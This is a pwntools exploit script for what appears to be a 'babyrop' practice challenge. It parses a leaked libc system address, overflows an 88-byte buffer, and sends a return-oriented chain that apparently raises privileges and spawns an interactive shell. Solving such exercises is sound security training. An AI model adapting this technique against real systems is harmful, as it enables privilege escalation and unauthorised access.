from pwn import *
context.binary = "/challenge/babyrop_level7.1"
context.terminal = ["tmux", "splitw", "-h"]
#p = gdb.debug("/challenge/babyrop_level7.0")
p = process()
ret = 0x000000000040101a
offset = 88
pop_rdi = 0x0000000000401733
p.recvuntil(b'libc is: ')
sys_leak = int(p.recvuntil(b'.').decode().strip('.'),base=16)
log.info("Leaked system address: %s", hex(sys_leak))
payload = b'A'*offset + p64(ret) + p64(pop_rdi) + p64(0) + p64(sys_leak+597696) + p64(ret)
payload += p64(pop_rdi) + p64(sys_leak+1450797) + p64(sys_leak+4) + p64(0)
p.sendline(payload)
p.interactive()